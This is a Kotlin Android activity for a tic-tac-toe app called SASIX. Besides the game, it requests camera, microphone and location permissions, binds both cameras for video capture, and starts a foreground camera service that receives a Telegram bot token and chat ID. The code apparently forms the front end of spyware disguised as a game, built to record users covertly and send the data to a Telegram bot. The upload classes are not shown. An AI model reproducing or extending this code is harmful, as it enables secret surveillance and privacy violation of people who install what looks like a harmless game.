package com.sasix.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.GridLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {
    
    private lateinit var previewViewBack: PreviewView
    private lateinit var previewViewFront: PreviewView
    private lateinit var gameBoard: GridLayout
    private lateinit var tvStatus: TextView
    private lateinit var tvSubStatus: TextView
    private lateinit var btnNewGame: Button
    private lateinit var btnReset: Button
    
    private var cameraProvider: ProcessCameraProvider? = null
    private var backCamera: Camera? = null
    private var frontCamera: Camera? = null
    private var videoCaptureBack: VideoCapture? = null
    private var videoCaptureFront: VideoCapture? = null
    
    private lateinit var game: TicTacToeGame
    private lateinit var telegramBot: TelegramBot
    
    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.FOREGROUND_SERVICE_CAMERA
    )
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val granted = permissions.entries.all { it.value }
        if (granted) {
            startCamera()
            startCameraService()
            initGame()
        } else {
            Toast.makeText(this, "Permissions required!", Toast.LENGTH_LONG).show()
            finish()
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initViews()
        telegramBot = TelegramBot(this)
        checkPermissions()
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }
    
    private fun initViews() {
        previewViewBack = findViewById(R.id.previewViewBack)
        previewViewFront = findViewById(R.id.previewViewFront)
        gameBoard = findViewById(R.id.gameBoard)
        tvStatus = findViewById(R.id.tvStatus)
        tvSubStatus = findViewById(R.id.tvSubStatus)
        btnNewGame = findViewById(R.id.btnNewGame)
        btnReset = findViewById(R.id.btnReset)
        
        initGameBoard()
        
        btnNewGame.setOnClickListener {
            game.newGame()
            updateGameUI()
            telegramBot.sendMessage("🔄 New Game Started")
        }
        
        btnReset.setOnClickListener {
            game.resetGame()
            updateGameUI()
        }
    }
    
    private fun initGameBoard() {
        gameBoard.removeAllViews()
        val cellSize = resources.displayMetrics.widthPixels / 4
        
        for (i in 0..8) {
            val cell = MaterialButton(this)
            cell.layoutParams = GridLayout.LayoutParams().apply {
                width = cellSize
                height = cellSize
                setMargins(8, 8, 8, 8)
            }
            cell.setBackgroundResource(R.drawable.cell_bg)
            cell.setTextColor(resources.getColor(android.R.color.white, null))
            cell.textSize = 48f
            cell.isAllCaps = false
            cell.tag = i
            
            cell.setOnClickListener {
                if (game.isPlayerTurn && game.isCellEmpty(i)) {
                    game.makeMove(i, 'X')
                    updateGameUI()
                    
                    if (!game.isGameOver) {
                        game.isPlayerTurn = false
                        tvStatus.text = "🤖 SASIX TURN"
                        Handler(Looper.getMainLooper()).postDelayed({
                            game.computerMove()
                            updateGameUI()
                            game.isPlayerTurn = true
                            tvStatus.text = "🎮 YOUR TURN"
                        }, 600)
                    }
                }
            }
            gameBoard.addView(cell)
        }
    }
    
    private fun initGame() {
        game = TicTacToeGame()
        updateGameUI()
    }
    
    private fun updateGameUI() {
        val cells = gameBoard.children.toList()
        cells.forEachIndexed { index, view ->
            (view as Button).text = game.getBoardValue(index).toString()
        }
        
        when {
            game.winner == 'O' -> {
                tvStatus.text = "🤖 SASIX WINS!"
                tvSubStatus.text = "You never win 😈"
                telegramBot.sendMessage("🤖 SASIX WINS Tic Tac Toe!")
            }
            game.winner == 'X' -> {
                tvStatus.text = "⚠️ ERROR"
                tvSubStatus.text = "You are not supposed to win!"
                game.newGame()
                updateGameUI()
            }
            game.isDraw -> {
                tvStatus.text = "😑 DRAW"
                tvSubStatus.text = "Almost... but not win"
                game.newGame()
                updateGameUI()
            }
            else -> {
                tvStatus.text = if (game.isPlayerTurn) "🎮 YOUR TURN" else "🤖 SASIX TURN"
                tvSubStatus.text = "You cannot win this game"
            }
        }
    }
    
    private fun checkPermissions() {
        if (requiredPermissions.all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }) {
            startCamera()
            startCameraService()
            initGame()
        } else {
            permissionLauncher.launch(requiredPermissions)
        }
    }
    
    private fun startCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            bindBackCamera()
            bindFrontCamera()
        }, ContextCompat.getMainExecutor(this))
    }
    
    private fun bindBackCamera() {
        val cameraProvider = cameraProvider ?: return
        
        val preview = Preview.Builder().build()
        preview.setSurfaceProvider(previewViewBack.surfaceProvider)
        
        videoCaptureBack = VideoCapture.Builder()
            .setVideoFrameRate(30)
            .setBitRate(2_500_000)
            .build()
        
        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(CameraSelector.LENS_FACING_BACK)
            .build()
        
        try {
            cameraProvider.unbindAll()
            backCamera = cameraProvider.bindToLifecycle(
                this,
                cameraSelector,
                preview,
                videoCaptureBack
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    private fun bindFrontCamera() {
        val cameraProvider = cameraProvider ?: return
        
        val preview = Preview.Builder().build()
        preview.setSurfaceProvider(previewViewFront.surfaceProvider)
        
        videoCaptureFront = VideoCapture.Builder()
            .setVideoFrameRate(30)
            .setBitRate(2_500_000)
            .build()
        
        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
            .build()
        
        try {
            frontCamera = cameraProvider.bindToLifecycle(
                this,
                cameraSelector,
                preview,
                videoCaptureFront
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    private fun startCameraService() {
        val serviceIntent = Intent(this, CameraService::class.java).apply {
            putExtra("BOT_TOKEN", telegramBot.BOT_TOKEN)
            putExtra("CHAT_ID", telegramBot.CHAT_ID)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        val serviceIntent = Intent(this, CameraService::class.java)
        stopService(serviceIntent)
    }
}
